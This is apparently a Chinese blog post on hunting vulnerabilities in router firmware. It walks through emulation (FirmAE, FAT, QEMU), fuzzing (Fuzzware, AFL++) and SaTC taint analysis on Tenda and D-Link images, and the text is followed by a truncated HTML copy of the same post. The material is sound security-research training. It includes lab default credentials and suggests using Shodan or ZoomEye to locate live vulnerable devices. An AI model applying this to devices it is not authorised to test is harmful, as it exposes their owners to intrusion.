需要测试网络是否连通，web是否正常访问，若有其他开放端口是否能正常访问等 也可以使用FirmAFL、FirmFuzz、Fuzzware来进行仿真模拟+fuzz 工具仿真效果不理想时可以使用qemu来进行仿真 Unicorn和Qiling暂时了解较少，也可以用来仿真模拟 FirmAE # 成功概率较高（优于Firmadyne） FirmAE significantly increases the emulation success rate (From Firmadyne\u0026rsquo;s 16.28% to 79.36%) FirmAE及DlinkDIR320、600、645漏洞复现 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn pr0v3rbs/FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis (github.com) Index of /pub/Router/DIR-645/Firmware (dlink.ru) 安装：\ngit clone --recursive https://github.com/pr0v3rbs/FirmAE ./download.sh ./install.sh 使用：\n执行脚本\n./init.sh 准备固件\n# 举例： wget https://github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip 检查仿真\nsudo ./run.sh -c \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt; 分析目标固件\n分析模式使用 FirmAE 分析器 sudo ./run.sh -a \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt; 运行模式有助于测试 Web 服务或执行自定义分析器 sudo ./run.sh -r \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt; Firmware Analysis Toolkit # attify/firmware-analysis-toolkit: Toolkit to emulate firmware and analyse it for security vulnerabilities (github.com)\n安装：\ngit clone https://github.com/attify/firmware-analysis-toolkit cd firmware-analysis-toolkit ./setup.sh # fat.config [DEFAULT] sudo_password=attify123 firmadyne_path=/home/attify/firmadyne 使用：\n./fat.py \u0026lt;firmware file\u0026gt; $ ./fat.py DIR-601_REVB_FIRMWARE_2.01.BIN __ _ / _| | | | |_ __ _ | |_ | _| / _` | | __| | | | (_| | | |_ |_| \\__,_| \\__| Welcome to the Firmware Analysis Toolkit - v0.3 Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation By Attify - https://attify.com | @attifyme [+] Firmware: DIR-601_REVB_FIRMWARE_2.01.BIN [+] Extracting the firmware... [+] Image ID: 1 [+] Identifying architecture... [+] Architecture: mipseb [+] Building QEMU disk image... [+] Setting up the network connection, please standby... [+] Network interfaces: [(\u0026#39;br0\u0026#39;, \u0026#39;192.168.0.1\u0026#39;)] [+] All set! Press ENTER to run the firmware... [+] When running, press Ctrl + A X to terminate qemu QEMU # https://wokough.gitbook.io/iot-firmware-aio/wiki/fang-zhen-fen-xi#id-1.1-qemu\n具体问题具体分析\n具体固件使用对应的命令进行仿真\n先上网搜索相关信息，看看有没有文章已经仿真过了 参考之前仿真设备的案例来试着仿真 如果都没有就需要我们参考着官方文档以及对固件的静态分析来自己调整命令 如果遇到一些参数实在没有办法满足时可以先跑起来 在动态调试的过程看是哪个汇编执行报错 再在IDA中进行合适的patch来使得固件可以成功仿真 例如当我们需要向main函数传递参数argv和设置环境变量时，可以先看看官方usage：\n发现我们可以用-0选项传递第一个参数，用-E选项设置环境变量，用-L选项做到类似于更改根目录的效果，用-strace选项追踪程序执行时进程系统调用和所接收的信号，方便调试\n部分固件的仿真需要我们使用qemu来配置网络\n可以先拍一个快照再来开始仿真，便于会快照重新配置\n参考 IoT-vulhub项目网络配置的方法，可以得到一个配置网络的shell文件模版\n#!/bin/bash # 启动 ssh 服务 /etc/init.d/ssh start # 配置网卡 tunctl -t tap0 ifconfig tap0 192.168.2.1/24 # 启动 http 服务 nohup python3 -m http.server 8000 1\u0026gt;\u0026amp;/dev/null \u0026amp; # 进入 qemu 镜像目录 cd /root/images /usr/bin/expect\u0026lt;\u0026lt;EOF set timeout 10000 # 依照固件及qemu文档更改此处命令 spawn qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append \u0026#34;root=/dev/sda1 console=tty0\u0026#34; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic expect \u0026#34;debian-mips login:\u0026#34; send \u0026#34;root\\r\u0026#34; expect \u0026#34;Password:\u0026#34; send \u0026#34;root\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;ifconfig eth0 192.168.2.2/24\\r\u0026#34; #expect \u0026#34;root@debian-mips:~# \u0026#34; #send \u0026#34;echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;scp root@192.168.2.1:/root/squashfs-root.tar.gz /root/squashfs-root.tar.gz\\r\u0026#34; expect { \u0026#34;(yes/no)? \u0026#34; { send \u0026#34;yes\\r\u0026#34;; exp_continue } \u0026#34;password: \u0026#34; { send \u0026#34;root\\r\u0026#34; } } expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;tar xzf squashfs-root.tar.gz \u0026amp;\u0026amp; rm squashfs-root.tar.gz\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;mount -o bind /dev ./squashfs-root/dev \u0026amp;\u0026amp; mount -t proc /proc ./squashfs-root/proc\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;scp -r root@192.168.2.1:/root/tools /root/squashfs-root/tools\\r\u0026#34; expect { \u0026#34;(yes/no)? \u0026#34; { send \u0026#34;yes\\r\u0026#34;; exp_continue } \u0026#34;password: \u0026#34; { send \u0026#34;root\\r\u0026#34; } } expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;echo \u0026#39;sleep 30\u0026#39; \u0026gt; net.sh\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;echo \u0026#39;ifconfig eth0 192.168.2.2/24\u0026#39; \u0026gt;\u0026gt; net.sh\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;echo \u0026#39;ifconfig br0 192.168.2.3/24\u0026#39; \u0026gt;\u0026gt; net.sh\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;chmod +x net.sh \u0026amp;\u0026amp; /bin/sh net.sh \u0026amp;\\r\u0026#34; expect \u0026#34;root@debian-mips:~# \u0026#34; send \u0026#34;chroot squashfs-root/ sh\\r\u0026#34; expect \u0026#34;# \u0026#34; send \u0026#34;./bin/upnp\\r\u0026#34; expect \u0026#34;# \u0026#34; send \u0026#34;./bin/mic\\r\u0026#34; expect eof EOF 0x04 fuzz # 动态分析查找漏洞时主要通过各类fuzz工具来得到漏洞的触发点\n主要使用FirmAFL、FirmFuzz、Fuzzware工具来进行fuzz 也可以使用afl与afl++ Fuzzware # fuzzware-fuzzer/fuzzware: Fuzzware\u0026rsquo;s main repository. Start here to install. (github.com)\ngit clone https://github.com/fuzzware-fuzzer/fuzzware.git sudo ./build_docker.sh sudo ./run_docker.sh examples fuzzware pipeline --skip-afl-cpufreq pw-recovery/ARCH_PRO sudo ./run_docker.sh test fuzzware pipeline --skip-afl-cpufreq . 成功将固件跑起来：\n由图可以看到刚开始运行时发现新的MMIO寄存器模型，由于MMIO Access Model中并不存在，因此会将其定义为新的模型，然后继续向下运行\n建模完毕后，开始进行正常的fuzzing阶段：\n每一轮fuzzing结束后，根据反馈调整输入，开始下一阶段fuzzing：\nafl++ # 有源码 # 使用 afl-gcc 进行插桩编译：\nafl-gcc test.c -o test_file gcc test.c -o test_gcc afl-gcc 插桩编译后，fuzz 的速度会快一些 接下来就可以进行 fuzz 了：\nafl-fuzz -i ./fuzz_in -o ./fuzz_out ./test_file -f fuzz_in 为语料库，可以直接使用 AFL 自带的 testcases fuzz_out 就是输出的内容 无源码 # 配置：\nsudo apt-get install libtool-bin libgtk2.0-dev -y cd /home/iot/test/tools/AFLplusplus/qemu_mode ./build_qemu_support.sh cd .. sudo make install afl-fuzz -Q -m none -i in -o out ./pwn_file @@ /home/iot/test/tools/AFLplusplus/afl-fuzz -i fuzz_in -o ./fuzz_out -Q ./pwn 0x05 静态分析 # 浅析IOT二进制静态辅助方法 - FreeBuf网络安全行业门户\nIDA\n大多数是32位的，少数是64位的 推荐安装keypatch插件，在patch固件的时候会方便一些 Ghira\n可以安装许多有用的插件 SaTC\n自动化挖掘工具 其他二进制静态辅助工具\nBinAbsInspector Rhabdomancer Haruspex + semgrep SaTC # NSSL-SJTU/SaTC: A prototype of Shared-keywords aware Taint Checking, a novel static analysis approach that tracks the data flow of the user input between front-end and back-end to precisely detect security vulnerabilities. (github.com)\n安装\n建议通过使用Dockerfile来构建系统环境:\n# 进入SaTC代码目录 cd SaTC # 构建Docker镜像 docker build . -t satc # 进入Dokcer环境, 自行添加目录映射 docker run -it satc 如果因为网络等原因无法构建，可使用我们提供等docker image\n# 从docker hun拉去image docker pull smile0304/satc:V1.0 # 进入Dokcer环境, 自行添加目录映射 docker run -it smile0304/satc:V1.0 使用方法\nusage: satc.py [-h] -d /root/path/_ac18.extracted -o /root/output [--ghidra_script {ref2sink_cmdi,ref2sink_bof,share2sink,ref2share,all}] [--save_ghidra_project] --taint_check [-b /var/ac18/bin/httpd | -l 3] SATC tool optional arguments: -h, --help 查看帮助 -d /root/path/_ac18.extracted, --directory /root/path/_ac18.extracted 指定从固件中提取出的文件系统 -o /root/output, --output /root/output 指定结果输出位置 --ghidra_script {ref2sink_cmdi,ref2sink_bof,share2sink,ref2share,all} (可选) 指定要使用的 Ghidra 脚本。 如果使用`all`命令，`ref2sink_cmdi`、`ref2sink_bof`和`ref2share`三个脚本将同时运行 --ref2share_result /root/path/ref2share_result (可选) 运行`share2sink` Ghidra脚本时，需要使用该参数指定`ref2share`脚本的输出结果 --save_ghidra_project (可选) 是否保存程序运行时产生的ghidra工程路径 --taint_check (可选) 指定是否启用污点分析 -b /var/ac18/bin/httpd, --bin /var/ac18/bin/httpd (可选) 用于指定需要分析的程序，如果不指定，SaTC将使用内置算法确认需要分析的程序 -l 3, --len 3 (可选) 根据分析结果分析可能为边界的前N个程序，默认为3 输出结果的目录结构为：\n|-- ghidra_extract_result # ghidra寻找函数调用路径的分析结果, 启用`--ghidra_script`选项会输出该目录 | |-- httpd # 每个被分析的bin都会生成一个同名文件夹 | |-- httpd # 被分析的bin | |-- httpd_ref2sink_bof.result # 定位bof类型的sink函数路径 | |-- httpd_ref2sink_cmdi.result # 定位cmdi类型的sink函数路径 |-- keyword_extract_result # 关键字提取结果 | |-- detail # 前端关键字提取结果(详细分析结果) | | |-- API_detail.result # 提取的API详细结果 | | |-- API_remove_detail.result # 被过滤掉的API信息 | | |-- api_split.result # 模糊匹配的API结果 | | |-- Clustering_result_v2.result # 详细分析结果(不关心其他过程关心此文件即可) | | |-- File_detail.result # 记录了从单独文件中提取的关键字 | | |-- from_bin_add_para.result # 在二进制匹配过程中新增的关键字 | | |-- from_bin_add_para.result_v2 # 同上,V2版本 | | |-- Not_Analysise_JS_File.result # 未被分析的JS文件 | | |-- Prar_detail.result # 提取的Prar详细结果 | | |-- Prar_remove_detail.result # 被过滤掉的Prar结果 | |-- info.txt # 记录前端关键字提取时间等信息 | |-- simple # 前端关键字提取结果, 比较简单 | |-- API_simple.result # 在全部二进制中出现的全部API名称 | |-- Prar_simple.result # 在全部二进制中出现等的全部Prar |-- result-httpd-ref2sink_cmdi-ctW8.txt # 污点分析结果,启用`--taint-check` 和 `--ghidra_script`选项才会生成该文件 在/home/satc/res下生成的txt文件可以查看结果\n0x06 验证漏洞 # 直接购买真实设备来验证漏洞 本地仿真模拟来验证 or 复现 可以先按照 0x03 部分先对固件进行仿真模拟 然后在本地对漏洞进行验证或复现 一些路由器固件的漏洞可以在一些网站上查找到还在用此路由器设备的站点 shodan ZoomEye 0x07 其他 # 挖漏洞之前可以先在各类cve cnvd平台搜索一下\n相关产品的漏洞可以提供参考\n也可以避免重复挖出/提交已有的漏洞\nCVE - Search CVE List (mitre.org)\nVulnerabilities (CVE) - OpenCVE (ics-csirt.io)\n挖出一个洞之后\n可以横向看看同一家厂商的其他产品是不是也存在类似的漏洞 可以思考这个漏洞点是否有其他更加有危害的利用方式 还可以思考一下如何修复这个漏洞\n应该如何打补丁 一些有漏洞的固件在第一次修补之后仍存在漏洞，我们的修复方式是否能避免这样的情况 可以参考一下winmt师傅的挖洞经历\n记一次全设备通杀未授权RCE的挖掘经历-看雪-安全社区| 后记 # 漏洞挖掘众多尝试的一小部分：\n尝试1 $ wget https://down.tenda.com.cn/uploadfile/AC18/ac18_kf_V15.03.05.19(6318_)_cn.zip $ binwalk -Me ac18_kf_V15.03.05.19(6318_)_cn.zip $ sudo docker run -it -v ./squashfs-root/:/home/satc/SaTC/SaTC_data smile0304/satc # 进入SaTC容器中 # 检查/home/satc/SaTC/SaTC_data文件夹中是否有数据 $ ls /home/satc/SaTC/SaTC_data $ cd ~/SaTC # 测试/bin/httpd是否存在命令注入漏洞 $ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script=ref2sink_cmdi -b httpd --taint_check # 测试/bin/httpd是否存在缓冲区溢出漏洞 $ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script=ref2sink_bof -b httpd --taint_check 过程中可能会飘红，或者警告，直接忽略，只要在/home/satc/res下输出txt文件就ok\n尝试2 $ wget https://down.tenda.com.cn/uploadfile/AC10/V16.03.48.23.zip $ unzip V16.03.48.23.zip \u0026amp;\u0026amp; cd V16.03.48.23 $ binwalk -Me US_AC10V5.0si_V16.03.48.23_cn_TDC01.bin 尝试3 $wget https://ftp.dlink.ru/pub/Router/DWR-921/Firmware/2023.07.20-15.22_DWR_921_POST_4.0.2_release.bin $ cd /home/iot/tools/firmware-analysis-toolkit $ ./fat.py /home/iot/vul/D-Link/DWR-921/2023.07.20-15.22_DWR_921_POST_4.0.2_release.bin $ binwalk -Me 2023.07.20-15.22_DWR_921_POST_4.0.2_release.bin $ sudo docker run -it -v ./squashfs-root/:/home/satc/SaTC/SaTC_data smile0304/satc # 进入SaTC容器中 # 检查/home/satc/SaTC/SaTC_data文件夹中是否有数据 $ ls /home/satc/SaTC/SaTC_data $ cd ~/SaTC # 测试/bin/httpd是否存在命令注入漏洞 $ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script=ref2sink_cmdi -b httpd --taint_check # 测试/bin/httpd是否存在缓冲区溢出漏洞 $ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script=ref2sink_bof -b httpd --taint_check 文章后面的部分还在施工中，\n路过的师傅们看看远处的学习记录吧！\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\rtest\ntest\ntest\nIoT基础学习 February 21, 2024\u0026middot;\u0026middot;6165 字\u0026middot;13 分钟 IoT学习记录 IoT IoT漏洞复现记录 February 22, 2024\u0026middot;\u0026middot;13389 字\u0026middot;27 分钟 IoT学习记录 IoT 尝试10086\u0026hellip; ","date":"February 23, 2024","permalink":"/posts/iot/0x03/","section":"Posts","summary":"\u003cdiv\n  \n    class=\"flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900\"\n  \u003e\n\n  \u003cspan\n    \n      class=\"text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center\"\n    \u003e\n\n    \n\n  \u003cspan class=\"relative block icon\"\u003e\n    \u003csvg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003cpath fill=\"currentColor\" d=\"M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z\"/\u003e\u003c/svg\u003e\n\n  \u003c/span\u003e\n\n\n  \u003c/span\u003e\n\n  \u003cspan\n    \n      class=\"dark:text-neutral-300\"\n    \u003e\u003cstrong\u003e如果本博客部分文章图片加载失败，\u003c/strong\u003e\u003ca href=\"/posts/sth/sm.ms/\"  \u003e\n    \u003cstrong\u003e可以点击此处查看解决办法\u003c/strong\u003e\u003c/a\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv id=\"0x01-获取固件\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e0x01 获取固件 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#0x01-%e8%8e%b7%e5%8f%96%e5%9b%ba%e4%bb%b6\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e一般从\u003cstrong\u003e固件厂商官网\u003c/strong\u003e获取\u003c/p\u003e\n\u003cp\u003e也可以通过抓设备升级的包、购买硬件设备来获取固件\u003c/p\u003e\n\u003cdiv id=\"0x02-解密固件\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e0x02 解密固件 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#0x02-%e8%a7%a3%e5%af%86%e5%9b%ba%e4%bb%b6\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e参考链接：\u003ca href=\"https://wokough.gitbook.io/iot-firmware-aio/wiki/gu-jian-jie-mi#yi-gu-jian-jia-mi-pan-duan\"   target=\"_blank\"\u003e\n    固件解密 - IOT 固件安全 All in One (gitbook.io)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在解密固件之前可以先上网查询有没有相关文章\u003c/li\u003e\n\u003cli\u003e也可以看一下同一品牌的其他固件是如何解密的\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e解密固件是分析加密固件所需迈过的第一道坎\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/bT35JcBd2Sn4gvR.png\" alt=\"image-20240225113753127\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cp\u003e部分固件的解密思路可以参考以下思路：\u003c/p\u003e\n\u003cp\u003e看看是不是仍有少部分固件（或过渡版本的固件）并未加密，当这些固件升级的过程中大概也会使用到解密的程序，因此可以\u003cstrong\u003e通过解开这些未加密固件，找到解密程序，并逆向分析出相关算法\u003c/strong\u003e，这也是固件解密常用的一种手段。并且，一般一个厂商的固件加密算法都是相同的，这样所有的固件我们都能够解开了\u003c/p\u003e\n\u003cp\u003e解密完固件为后续的静态分析做准备\u003c/p\u003e\n\u003cdiv id=\"0x03-仿真模拟\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch2 class=\"relative group\"\u003e0x03 仿真模拟 \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#0x03-%e4%bb%bf%e7%9c%9f%e6%a8%a1%e6%8b%9f\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e动态分析方法\u003c/strong\u003e需要固件进行仿真模拟，或者在物理设备上进行片上调试，来获得反馈信息\u003c/p\u003e\n\u003cp\u003e真实固件的调试可以参考：\u003ca href=\"https://wokough.gitbook.io/iot-firmware-aio/wiki/gu-jian-tiao-shi\"   target=\"_blank\"\u003e\n    固件调试 - IOT 固件安全 All in One (gitbook.io)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e而仿真模拟可以参考以下的思路来进行：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e先使用FirmAE、Firmware Analysis Toolkit等开箱即用的工具进行仿真\n\u003cul\u003e\n\u003cli\u003e固件跑起来并不意味着成功仿真\u003c/li\u003e\n\u003cli\u003e可能会有部分功能的缺失\u003c/li\u003e\n\u003cli\u003e需要测试网络是否连通，web是否正常访问，若有其他开放端口是否能正常访问等\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e也可以使用FirmAFL、FirmFuzz、Fuzzware来进行仿真模拟+fuzz\u003c/li\u003e\n\u003cli\u003e工具仿真效果不理想时可以使用qemu来进行仿真\n\u003cul\u003e\n\u003cli\u003eUnicorn和Qiling暂时了解较少，也可以用来仿真模拟\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv id=\"firmae\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch3 class=\"relative group\"\u003eFirmAE \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#firmae\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e成功概率较高（优于Firmadyne）\n\u003cul\u003e\n\u003cli\u003eFirmAE significantly increases the emulation success rate (From \u003ca href=\"https://github.com/firmadyne/firmadyne\"   target=\"_blank\"\u003e\n    Firmadyne\u003c/a\u003e\u0026rsquo;s 16.28% to 79.36%)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.52pojie.cn/thread-1572565-1-1.html\"   target=\"_blank\"\u003e\n    FirmAE及DlinkDIR320、600、645漏洞复现 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/pr0v3rbs/FirmAE\"   target=\"_blank\"\u003e\n    pr0v3rbs/FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis (github.com)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ftp.dlink.ru/pub/Router/DIR-645/Firmware/\"   target=\"_blank\"\u003e\n    Index of /pub/Router/DIR-645/Firmware (dlink.ru)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e安装：\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone --recursive https://github.com/pr0v3rbs/FirmAE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./download.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./install.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cstrong\u003e使用：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e执行脚本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./init.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e准备固件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 举例：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e检查仿真\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./run.sh -c \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e分析目标固件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e分析模式使用 FirmAE 分析器\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./run.sh -a \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e运行模式有助于测试 Web 服务或执行自定义分析器\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./run.sh -r \u0026lt;brand\u0026gt; \u0026lt;firmware\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\n\n\n\n\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" src=\"https://s2.loli.net/2024/02/25/UhFeDBbwIEcVaHs.png\" alt=\"image-20240225104426390\" /\u003e\n    \n  \u003c/figure\u003e\n\n\u003c/p\u003e\n\u003cdiv id=\"firmware-analysis-toolkit\" class=\"anchor\"\u003e\u003c/div\u003e\n\u003ch3 class=\"relative group\"\u003eFirmware Analysis Toolkit \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#firmware-analysis-toolkit\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/attify/firmware-analysis-toolkit\"   target=\"_blank\"\u003e\n    attify/firmware-analysis-toolkit: Toolkit to emulate firmware and analyse it for security vulnerabilities (github.com)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e安装：\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/attify/firmware-analysis-toolkit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e firmware-analysis-toolkit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./setup.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# fat.config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eDEFAULT\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esudo_password\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eattify123\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efirmadyne_path\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/home/attify/firmadyne\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cstrong\u003e使用：\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode 